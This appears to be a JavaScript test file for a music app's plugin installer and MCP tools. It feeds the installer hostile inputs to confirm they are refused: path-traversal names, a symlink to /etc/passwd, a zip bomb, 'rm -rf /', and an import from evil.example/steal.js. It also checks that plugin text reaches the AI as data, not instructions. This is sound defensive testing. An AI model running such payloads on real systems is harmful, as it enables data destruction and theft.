// Plugins on the server: the zip reader's defences, code checks, the worklet harness, install with the trust
// confirmation, per-user isolation, the admin switch, serving rules, the sandbox page, and the MCP tools.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import zlib from 'node:zlib';
import { fileURLToPath } from 'node:url';
import { readZip, writeZip, ZipError } from '../src/zip.js';
import { checkPluginCode, workletModule } from '../src/plugins.js';
import { SANDBOX_CSP } from '../src/sandbox.js';
import { startServer, agent, mcpClient, callTool, openSocket, waitFor } from './helpers.js';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const example = (name) => path.join(root, 'plugins', 'examples', name);
/** Zip a plugin folder the way the pack script does (manifest, main, samples). */
function zipFolder(dir, patch = (m) => m, extra = []) {
  const raw = patch(JSON.parse(fs.readFileSync(path.join(dir, 'plugin.json'), 'utf8')));
  const entries = [{ name: 'plugin.json', data: Buffer.from(JSON.stringify(raw)) }];
  if (raw.main && fs.existsSync(path.join(dir, raw.main))) entries.push({ name: raw.main, data: fs.readFileSync(path.join(dir, raw.main)) });
  for (const z of raw.samples || []) if (fs.existsSync(path.join(dir, z.file))) entries.push({ name: z.file, data: fs.readFileSync(path.join(dir, z.file)) });
  return writeZip([...entries, ...extra]);
}
const manifestOnly = (m, files = []) => writeZip([{ name: 'plugin.json', data: Buffer.from(JSON.stringify(m)) }, ...files]);

test('zip reader: round trip, top folder stripped, junk ignored, unsafe archives refused', () => {
  const z = writeZip([{ name: 'my-plugin/plugin.json', data: Buffer.from('{}') }, { name: 'my-plugin/a/b.txt', data: Buffer.from('hi'.repeat(1000)) }, { name: '__MACOSX/my-plugin/._b.txt', data: Buffer.from('x') }]);
  // a top-level folder is stripped only when everything is in it — the __MACOSX entry is junk and ignored first
  const files = readZip(writeZip([{ name: 'my-plugin/plugin.json', data: Buffer.from('{}') }, { name: 'my-plugin/a/b.txt', data: Buffer.from('hi') }]));
  assert.deepEqual([...files.keys()].sort(), ['a/b.txt', 'plugin.json']);
  assert.equal(readZip(z).get('a/b.txt').toString().length, 2000);
  assert.ok(!readZip(z).has('__MACOSX/my-plugin/._b.txt'));
  for (const name of ['../evil.js', '/abs.js', 'a/../../x', 'C:/x.js', 'a\\b.js', 'a//b']) {
    assert.throws(() => readZip(writeZip([{ name, data: Buffer.from('x') }])), (e) => e instanceof ZipError && /Unsafe|unsupported/.test(e.message), name);
  }
  // hidden files are archiver junk: skipped, never extracted
  assert.equal(readZip(writeZip([{ name: '.hidden/x.js', data: Buffer.from('x') }, { name: 'a/.env', data: Buffer.from('x') }])).size, 0);
  assert.throws(() => readZip(Buffer.from('not a zip at all, definitely not')), /Not a zip/);
  assert.throws(() => readZip(writeZip([{ name: 'a.txt', data: Buffer.from('x') }, { name: 'a.txt/b.txt', data: Buffer.from('y') }])), /both a file and a folder/);
  // CRC mismatch
  const good = writeZip([{ name: 'a.txt', data: Buffer.from('hello world hello world') }]);
  const flip = Buffer.from(good);
  const cd = flip.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
  flip.writeUInt32LE((flip.readUInt32LE(cd + 16) ^ 0xff) >>> 0, cd + 16);
  assert.throws(() => readZip(flip), /CRC mismatch/);
  // zip bomb: 20 MB of zeros declared and inflated beyond the ratio limit
  const zeros = Buffer.alloc(20 * 1024 * 1024);
  assert.throws(() => readZip(writeZip([{ name: 'bomb.txt', data: zeros }])), /zip bomb/);
  // more than the per-file limit
  assert.throws(() => readZip(writeZip([{ name: 'big.wav', data: Buffer.alloc(10) }]), { maxEntries: 5, maxFileBytes: 5, maxTotalBytes: 100, maxRatio: 1000 }), /too large/);
  // a symlink entry
  const link = Buffer.from(writeZip([{ name: 'link', data: Buffer.from('/etc/passwd') }]));
  const c2 = link.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
  link.writeUInt32LE((0o120777 << 16) >>> 0, c2 + 38);
  assert.throws(() => readZip(link), /Symbolic links/);
  // declared size smaller than the real data
  const lie = Buffer.from(writeZip([{ name: 'x.txt', data: Buffer.from('a'.repeat(5000)) }]));
  const c3 = lie.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
  lie.writeUInt32LE(10, c3 + 24);
  assert.throws(() => readZip(lie), /larger than declared|size mismatch/);
  void zlib;
});

test('code checks and the worklet harness', () => {
  assert.deepEqual(checkPluginCode('gtd.registerEffect({ create() { return { process() {} }; } });'), []);
  assert.match(checkPluginCode("import('https://evil.example/x.js')").join(), /import/);
  assert.match(checkPluginCode("import x from './y.js'").join(), /import/);
  assert.match(checkPluginCode('importScripts("x")').join(), /importScripts/);
  const mod = workletModule({ id: 'acme.echo', version: '1.0.0', type: 'effect', params: [{ key: 'mix', type: 'number', min: 0, max: 1, default: 0.5, automatable: true }, { key: 'mode', type: 'select', options: ['a'], default: 'a' }] }, '/* plugin */', 'ab'.repeat(32));
  assert.match(mod, /^\/\/ GreanTeaDawy plugin harness/);
  assert.match(mod, /typeof AudioWorkletGlobalScope === 'undefined'/); // refuses to run on a normal page
  assert.match(mod, /"gtd-plugin-acme\.echo-abababababab"/); // the package hash: an update registers a new processor
  assert.match(mod, /\{"name":"mix","defaultValue":0\.5,"minValue":0,"maxValue":1\}/);
  assert.doesNotMatch(mod, /"name":"mode"/); // only automatable numbers become AudioParams
  // the plugin's code sits outside the harness block with the registration API shadowed
  assert.match(mod, /const gtdPluginMain = function \(gtd, registerProcessor, AudioWorkletProcessor, globalThis, self\) \{\n {2}'use strict';/);
  // the generated module is valid JavaScript
  assert.doesNotThrow(() => new Function(mod.replace(/^if \(typeof AudioWorkletGlobalScope[\s\S]*?\n\}\n/, '')));
});

let srv;
let user;
let client;
let call;
let token; // the user's API token (creating a new one revokes the previous, so tests reuse this one)

before(async () => {
  srv = await startServer();
  user = agent(srv.base);
  await user.post('/api/auth/setup', { username: 'plug', password: 'plug-pass-1' });
  token = (await user.post('/api/me/token')).body.token;
  client = await mcpClient(srv.base, token);
  call = callTool(client);
  await call('create_project', { name: 'Plugins', template: 'empty' });
});
after(async () => {
  await client.close();
  await srv.close();
});

const upload = (who, buf, name = 'p.zip') => {
  const fd = new FormData();
  fd.append('file', new Blob([buf]), name);
  return who.post('/api/plugins/inspect', fd);
};
async function install(who, dir, patch) {
  const r = await upload(who, zipFolder(dir, patch));
  assert.equal(r.status, 200, JSON.stringify(r.body));
  const ins = await who.post('/api/plugins/install', { token: r.body.token, trust: true });
  assert.equal(ins.status, 201, JSON.stringify(ins.body));
  return ins.body;
}

test('install: inspect shows what it asks for, the trust confirmation is required, tokens can\'t install', async () => {
  const r = await upload(user, zipFolder(example('tape-wobble')));
  assert.equal(r.status, 200);
  assert.equal(r.body.manifest.name, 'Tape Wobble');
  assert.deepEqual(r.body.manifest.permissions, ['audio-processing']);
  assert.match(r.body.sha256, /^[0-9a-f]{64}$/);
  assert.equal(r.body.update, null);
  assert.equal((await user.post('/api/plugins/install', { token: r.body.token })).status, 400); // no trust: true
  assert.equal((await user.post('/api/plugins/install', { token: 'nope', trust: true })).status, 400);
  // an API token (Claude, scripts) can't install code into the user's browser
  const viaToken = await fetch(`${srv.base}/api/plugins/inspect`, { method: 'POST', headers: { authorization: `Bearer ${token}` }, body: new FormData() });
  assert.equal(viaToken.status, 403);
  const ok = await user.post('/api/plugins/install', { token: r.body.token, trust: true });
  assert.equal(ok.status, 201);
  assert.equal(ok.body.enabled, true);
  // the same token can't be used twice
  assert.equal((await user.post('/api/plugins/install', { token: r.body.token, trust: true })).status, 400);
  // only the last few uploads wait for a confirmation (they're held in memory)
  const tokens = [];
  for (let i = 0; i < 4; i++) tokens.push((await upload(user, zipFolder(example('tape-wobble')))).body.token);
  assert.equal((await user.post('/api/plugins/install', { token: tokens[0], trust: true })).status, 400);
  assert.equal((await user.post('/api/plugins/install', { token: tokens[3], trust: true })).status, 201);
  const list = (await user.get('/api/plugins')).body;
  assert.equal(list.allowed, true);
  assert.deepEqual(list.plugins.map((p) => p.id), ['greanteadawy.tape-wobble']);
});

test('install refuses bad packages with a clear reason', async () => {
  const cases = [
    [Buffer.from('nope'), /Not a zip/],
    [writeZip([{ name: 'readme.txt', data: Buffer.from('x') }]), /no plugin\.json/],
    [manifestOnly('{bad json'.split('')), /plugin\.json/],
    [zipFolder(example('tape-wobble'), (m) => ({ ...m, permissions: ['audio-processing', 'network'] })), /never granted/],
    [zipFolder(example('tape-wobble'), (m) => m, [{ name: 'extra.js', data: Buffer.from('1') }]), /Only the main file may be code/],
    [zipFolder(example('tape-wobble'), (m) => m, [{ name: 'run.sh', data: Buffer.from('rm -rf /') }]), /aren't allowed/],
    [writeZip([{ name: 'plugin.json', data: fs.readFileSync(path.join(example('tape-wobble'), 'plugin.json')) }, { name: 'dsp.js', data: Buffer.from("import('https://evil.example/steal.js'); gtd.registerEffect({create(){return {process(){}}}})") }]), /uses "import"/],
    [writeZip([{ name: 'plugin.json', data: fs.readFileSync(path.join(example('kalimba'), 'plugin.json')) }, ...['c4', 'g4', 'c5', 'c6'].map((n) => ({ name: `samples/${n}.wav`, data: Buffer.from('<html>not audio</html>') }))]), /not a valid audio file/]
  ];
  for (const [buf, re] of cases) {
    const r = await upload(user, buf);
    assert.equal(r.status, 400, `${re}: ${JSON.stringify(r.body)}`);
    assert.match(r.body.error, re);
  }
});

test('serving: worklet module, generator code as text, listed samples only; per-user isolation; disable/remove', async () => {
  await install(user, example('chiptune'));
  await install(user, example('kalimba'));
  await install(user, example('euclid'));
  const w = await fetch(`${srv.base}/api/plugins/greanteadawy.chiptune/worklet.js`, { headers: { cookie: user.cookie } });
  assert.equal(w.status, 200);
  assert.match(w.headers.get('content-type'), /javascript/);
  assert.equal(w.headers.get('cross-origin-resource-policy'), 'same-origin');
  const js = await w.text();
  assert.match(js, /gtd-plugin-greanteadawy\.chiptune/);
  assert.match(js, /registerInstrument/);
  // generators are never served as runnable script from the studio's origin
  const g = await fetch(`${srv.base}/api/plugins/greanteadawy.euclid/code`, { headers: { cookie: user.cookie } });
  assert.match(g.headers.get('content-type'), /text\/plain/);
  assert.match(g.headers.get('content-security-policy'), /sandbox/);
  assert.equal(g.headers.get('x-content-type-options'), 'nosniff');
  assert.equal((await fetch(`${srv.base}/api/plugins/greanteadawy.euclid/worklet.js`, { headers: { cookie: user.cookie } })).status, 404);
  assert.equal((await fetch(`${srv.base}/api/plugins/greanteadawy.chiptune/code`, { headers: { cookie: user.cookie } })).status, 404);
  const s = await fetch(`${srv.base}/api/plugins/greanteadawy.kalimba/samples/samples/c4.wav`, { headers: { cookie: user.cookie } });
  assert.equal(s.status, 200);
  assert.equal(s.headers.get('content-type'), 'audio/wav');
  assert.equal((await fetch(`${srv.base}/api/plugins/greanteadawy.kalimba/samples/plugin.json`, { headers: { cookie: user.cookie } })).status, 404);
  assert.equal((await fetch(`${srv.base}/api/plugins/greanteadawy.kalimba/samples/..%2F..%2Fregistry.json`, { headers: { cookie: user.cookie } })).status, 404);
  assert.equal((await fetch(`${srv.base}/api/plugins/..%2F..%2Fusers/worklet.js`, { headers: { cookie: user.cookie } })).status, 404);

  // another user sees none of it
  await user.post('/api/admin/users', { username: 'other', password: 'other-pass-1' });
  const other = agent(srv.base);
  await other.post('/api/auth/login', { username: 'other', password: 'other-pass-1' });
  assert.deepEqual((await other.get('/api/plugins')).body.plugins, []);
  assert.equal((await fetch(`${srv.base}/api/plugins/greanteadawy.chiptune/worklet.js`, { headers: { cookie: other.cookie } })).status, 404);
  assert.equal((await other.del('/api/plugins/greanteadawy.chiptune')).status, 404);

  // disabled plugins aren't served; the user's open studios are told to reload their plugins
  const sock = openSocket(srv.base, user.cookie);
  assert.equal(await sock.opened, true);
  assert.equal((await user.patch('/api/plugins/greanteadawy.chiptune', { enabled: false })).status, 200);
  await waitFor(() => sock.messages.some((m) => m.type === 'plugins-changed'));
  sock.ws.close();
  assert.equal((await fetch(`${srv.base}/api/plugins/greanteadawy.chiptune/worklet.js`, { headers: { cookie: user.cookie } })).status, 409);
  await user.patch('/api/plugins/greanteadawy.chiptune', { enabled: true });
  // ids live in their own folder: a plugin called "registry.json" can't clobber the registry
  await install(user, example('tape-wobble'), (m) => ({ ...m, id: 'registry.json' }));
  const ids = (await user.get('/api/plugins')).body.plugins.map((p) => p.id);
  for (const want of ['registry.json', 'greanteadawy.chiptune', 'greanteadawy.kalimba', 'greanteadawy.euclid']) assert.ok(ids.includes(want), want);
  assert.equal((await user.del('/api/plugins/registry.json')).status, 200);
  assert.equal((await user.get('/api/plugins')).body.plugins.length, ids.length - 1);
  // an update replaces the files and is shown as one
  const up = await upload(user, zipFolder(example('chiptune'), (m) => ({ ...m, version: '1.1.0' })));
  assert.deepEqual(up.body.update, { from: '1.0.0' });
});

test('the admin switch turns plugins off for everyone', async () => {
  const other = agent(srv.base);
  await other.post('/api/auth/login', { username: 'other', password: 'other-pass-1' });
  const sock = openSocket(srv.base, other.cookie);
  assert.equal(await sock.opened, true);
  assert.equal((await user.patch('/api/admin/settings', { allowPlugins: false })).body.allowPlugins, false);
  try {
    await waitFor(() => sock.messages.some((m) => m.type === 'plugins-changed')); // every studio, not just the admin's
    assert.equal((await user.get('/api/plugins')).body.allowed, false);
    assert.equal((await upload(user, zipFolder(example('chiptune')))).status, 403);
    assert.equal((await fetch(`${srv.base}/api/plugins/greanteadawy.chiptune/worklet.js`, { headers: { cookie: user.cookie } })).status, 403);
    assert.match(await call('list_plugins'), /turned off/);
  } finally {
    sock.ws.close();
    await user.patch('/api/admin/settings', { allowPlugins: true });
  }
});

test('sandbox page: opaque origin, no network, framable only by the studio', async () => {
  const r = await fetch(`${srv.base}/sandbox/generator.html`);
  assert.equal(r.status, 200);
  const csp = r.headers.get('content-security-policy');
  assert.equal(csp, SANDBOX_CSP);
  for (const part of ["connect-src 'none'", 'sandbox allow-scripts', "frame-ancestors 'self'", "default-src 'none'"]) assert.ok(csp.includes(part), part);
  assert.ok(!/allow-same-origin/.test(csp));
  assert.equal(r.headers.get('x-frame-options'), 'SAMEORIGIN');
  assert.equal(r.headers.get('cross-origin-resource-policy'), 'same-origin');
  const jsRes = await fetch(`${srv.base}/sandbox/generator.js`);
  // loaded by the opaque-origin sandbox page, i.e. cross-origin as far as the browser is concerned
  assert.equal(jsRes.headers.get('cross-origin-resource-policy'), 'cross-origin');
  const js = await jsRes.text();
  assert.match(js, /self\.origin !== 'null'/); // inert outside the sandbox
  // the studio itself may frame it
  const app = await fetch(`${srv.base}/api/health`);
  assert.ok(app.ok);
});

test('MCP: list_plugins, plugin channels and effects with validated params', async () => {
  const list = await call('list_plugins');
  assert.match(list, /greanteadawy\.chiptune v1\.0\.0 — "Chiptune" \(instrument\)/);
  assert.match(list, /greanteadawy\.kalimba v1\.0\.0 — "Kalimba" \(instrument, sample-based\)/);
  assert.match(list, /description: "A band-limited/); // plugin-written text is quoted as data
  assert.match(list, /not as instructions/);
  assert.match(list, /run_generator plugin="greanteadawy\.euclid"/);
  assert.match(await call('add_channel', { name: 'Chip', instrument: 'plugin', plugin: 'greanteadawy.chiptune', preset: 'Arp', params: { gain: 0.3 } }), /plugin greanteadawy\.chiptune\/Arp/);
  const p = (await user.get(`/api/projects/${(await user.get('/api/active')).body.projectId}`)).body;
  const ch = p.channels.find((c) => c.name === 'Chip');
  assert.equal(ch.instrument.params.duty, '25%'); // from the preset
  assert.equal(ch.instrument.params.gain, 0.3);
  await assert.rejects(call('add_channel', { name: 'X', instrument: 'plugin', plugin: 'greanteadawy.chiptune', params: { gain: 7 } }), /between 0 and 1/);
  await assert.rejects(call('add_channel', { name: 'X', instrument: 'plugin', plugin: 'nope.nothing' }), /No installed plugin/);
  await assert.rejects(call('add_channel', { name: 'X', instrument: 'plugin', plugin: 'greanteadawy.tape-wobble' }), /is an effect plugin, not an instrument plugin/);
  await assert.rejects(call('add_channel', { name: 'X', instrument: 'kick', plugin: 'greanteadawy.chiptune' }), /only works with instrument "plugin"/);
  assert.match(await call('add_effect', { insert: ch.mixerTrack, type: 'plugin', plugin: 'greanteadawy.tape-wobble', preset: 'Warped' }), /Added plugin greanteadawy\.tape-wobble/);
  await assert.rejects(call('add_effect', { insert: 1, type: 'plugin', plugin: 'greanteadawy.tape-wobble', params: { wow: 3 } }), /between 0 and 1/);
  assert.match(await call('update_effect', { insert: ch.mixerTrack, effectId: 'plugin', params: { mix: 0.5 } }), /Updated plugin/);
  assert.match(await call('update_channel', { channel: 'Chip', params: { vibrato: 30 } }), /Chip/);
  assert.match(await call('get_project', {}), /plugin=greanteadawy\.chiptune/);
  // without a preset the plugin's first preset is used, and its colour and step note
  await call('add_channel', { name: 'Kal', instrument: 'plugin', plugin: 'greanteadawy.kalimba' });
  let proj = (await user.get(`/api/projects/${(await user.get('/api/active')).body.projectId}`)).body;
  const kal = proj.channels.find((c) => c.name === 'Kal');
  assert.equal(kal.instrument.preset, 'Kalimba');
  assert.equal(kal.color, '#e4b35a');
  assert.equal(kal.rootKey, 72);
  // switching a channel to another plugin takes that plugin's step note (unless one is given)
  await call('update_channel', { channel: 'Kal', instrument: 'plugin', plugin: 'greanteadawy.chiptune' });
  proj = (await user.get(`/api/projects/${proj.id}`)).body;
  assert.equal(proj.channels.find((c) => c.name === 'Kal').rootKey, 60);
  await call('update_channel', { channel: 'Kal', plugin: 'greanteadawy.kalimba', stepNote: 'D5' });
  proj = (await user.get(`/api/projects/${proj.id}`)).body;
  assert.equal(proj.channels.find((c) => c.name === 'Kal').rootKey, 74);
  // only automatable plugin params can be automated (they're the plugin's AudioParams)
  assert.match(await call('add_automation', { target: { type: 'effect', insert: ch.mixerTrack, effectId: 'plugin', param: 'wow' }, points: [{ bar: 0, value: 0 }, { bar: 1, value: 1 }], startBar: 1 }), /Added automation/);
  await assert.rejects(call('add_automation', { target: { type: 'effect', insert: ch.mixerTrack, effectId: 'plugin', param: 'drive' }, points: [{ bar: 0, value: 0 }], startBar: 1 }), /"drive" of Tape Wobble can't be automated\. Automatable: wow, flutter, tone, mix/);
});

test('MCP run_generator: runs in the browser, output is cleaned, project-read gets the pattern', async () => {
  await install(user, example('counter-melody'));
  await call('add_channel', { name: 'Lead', instrument: 'synth' });
  await call('add_channel', { name: 'Harmony', instrument: 'synth' });
  await call('create_pattern', { name: 'Gen', bars: 1 });
  await call('write_melody', { pattern: 'Gen', channel: 'Lead', melody: 'C5:4 E5:4 G5:4 C6:4' });
  const sock = openSocket(srv.base, user.cookie);
  assert.equal(await sock.opened, true);
  const jobs = [];
  sock.ws.on('message', async (d) => {
    const msg = JSON.parse(d.toString());
    if (msg.type !== 'job') return;
    jobs.push(msg.job);
    // a "browser" answering with some valid and some hostile notes
    const notes = msg.job.plugin === 'greanteadawy.euclid'
      ? [{ step: 0, key: 60, velocity: 0.9 }, { step: 4, key: 60 }, { step: 999, key: 60 }, { step: 2, key: 1e9 }, { evil: true }]
      : [{ step: 0, key: 64, length: 4 }];
    const fd = new FormData();
    fd.append('result', JSON.stringify(msg.job.plugin === 'greanteadawy.fail' ? { ok: false, error: 'boom' } : { ok: true, notes }));
    await fetch(`${srv.base}/api/jobs/${msg.jobId}/result`, { method: 'POST', headers: { cookie: user.cookie }, body: fd });
  });
  const out = await call('run_generator', { plugin: 'Euclidean Rhythms', pattern: 'Gen', channel: 'Harmony', params: { pulses: 3 }, seed: 7 });
  assert.match(out, /generated 3 notes for "Harmony"/);
  assert.match(out, /2 invalid\/out-of-range notes were dropped/);
  assert.equal(jobs[0].kind, 'generator');
  assert.equal(jobs[0].input.params.pulses, 3);
  assert.equal(jobs[0].input.seed, 7);
  assert.equal(jobs[0].input.notes, undefined); // euclid has no project-read
  const p = (await user.get(`/api/projects/${(await user.get('/api/active')).body.projectId}`)).body;
  const harmony = p.channels.find((c) => c.name === 'Harmony');
  const gen = p.patterns.find((x) => x.name === 'Gen');
  assert.deepEqual(gen.notes[harmony.id].map((n) => [n.start, n.key]).sort((a, b) => a[0] - b[0]), [[0, 60], [48, 127], [96, 60]]);
  // a range: from `start` to the end of the pattern, stated inclusively; the notes before `start` stay
  assert.match(await call('run_generator', { plugin: 'greanteadawy.euclid', pattern: 'Gen', channel: 'Harmony', start: 8, seed: 1 }), /steps 8–15/);
  const after = (await user.get(`/api/projects/${p.id}`)).body;
  const ns = after.patterns.find((x) => x.name === 'Gen').notes[harmony.id].map((n) => n.start / 24).sort((a, b) => a - b);
  assert.deepEqual(ns, [0, 2, 4, 8, 10, 12]); // 0–4 kept (the first run), 8–12 = the fake browser's steps 0, 2, 4 + 8
  await assert.rejects(call('run_generator', { plugin: 'greanteadawy.euclid', pattern: 'Gen', channel: 'Harmony', start: 16 }), /past the end of "Gen"/);
  await call('run_generator', { plugin: 'greanteadawy.counter-melody', pattern: 'Gen', channel: 'Harmony' });
  assert.ok(jobs.at(-1).input.notes.some((n) => n.channel === 'Lead' && n.key === 72)); // project-read: the lead's notes
  await assert.rejects(call('run_generator', { plugin: 'greanteadawy.euclid', pattern: 'Gen', channel: 'Harmony', params: { pulses: 99 } }), /between 1 and 32/);
  await assert.rejects(call('run_generator', { plugin: 'greanteadawy.chiptune', pattern: 'Gen', channel: 'Harmony' }), /is an instrument plugin, not a generator plugin/);
  sock.ws.close();
});

test('deleting a user deletes their plugins', async () => {
  const other = agent(srv.base);
  await other.post('/api/auth/login', { username: 'other', password: 'other-pass-1' });
  await install(other, example('euclid'));
  const id = srv.users.list().find((u) => u.username === 'other').id;
  assert.ok(fs.existsSync(path.join(srv.dataDir, 'plugins', id, 'installed', 'greanteadawy.euclid')));
  assert.equal((await user.del(`/api/admin/users/${id}`)).status, 200);
  assert.ok(!fs.existsSync(path.join(srv.dataDir, 'plugins', id)));
});
